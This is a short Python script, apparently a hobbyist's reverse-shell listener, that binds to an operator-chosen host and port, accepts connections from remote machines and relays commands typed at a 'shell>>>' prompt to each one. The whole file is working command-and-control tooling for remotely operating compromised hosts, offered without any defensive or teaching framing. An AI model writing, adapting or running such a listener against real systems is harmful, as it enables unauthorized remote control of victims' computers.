#! /usr/bin/python3
#-*- encoding: utf-8 -*-
#Auther: kiyotaka
#Time: 2021/9/12

import socket
import sys
from threading import Thread

def server():
    LHOST = str(input("LHOST: "))
    LPORT = int(input("LPORT: "))
    ser_addr = (LHOST,LPORT)

    try:
        ser = socket.socket()
        ser.bind(ser_addr)
        ser.listen(5)

    except socket.error as e:
        print("[-] {}".format(e))

    print("[*] waiting...")

    while True:
        client_socket, client_addr = ser.accept()

        if client_socket and client_addr:
            t = Thread(target=send_data, args=(client_socket, client_addr))
            t.start()

def send_data(client_socket, client_addr):
    print("[+] {} up!".format(client_addr))

    while True:
        data = client_socket.recv(1024).decode()
        print(data)

        cmd = str(input("shell>>> "))

        if cmd == "exit":
            client_socket.send(cmd.encode())
            sys.exit(1)

        elif cmd:
            client_socket.send(cmd.encode())

        else:
            print("\n")

if __name__ == "__main__":
    server()
